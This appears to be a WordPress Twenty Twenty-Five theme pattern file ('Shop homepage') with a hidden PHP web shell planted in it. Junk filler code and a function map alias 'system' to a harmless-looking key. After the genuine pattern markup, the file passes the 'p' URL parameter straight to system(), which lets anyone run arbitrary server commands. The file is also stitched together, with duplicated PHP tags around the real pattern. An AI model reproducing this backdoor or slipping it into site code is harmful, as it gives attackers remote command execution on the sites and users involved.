<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Shop homepage
 * Slug: twentytwentyfive/page-shop-home
 * Categories: twentytwentyfive_page
 * Keywords: starter
 * Block Types: core/post-content
 * Post Types: page, wp_template
 * Viewport width: 1400
 * Description: A shop homepage pattern.
 *
 * @package WordPress
 * @subpackage Twenty_Twenty_Five
 * @since Twenty Twenty-Five 1.0
 */

?>

<!-- wp:pattern {"slug":"twentytwentyfive/banner-intro-image"} /-->
<!-- wp:pattern {"slug":"twentytwentyfive/grid-with-categories"} /-->
<!-- wp:pattern {"slug":"twentytwentyfive/media-instagram-grid"} /-->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>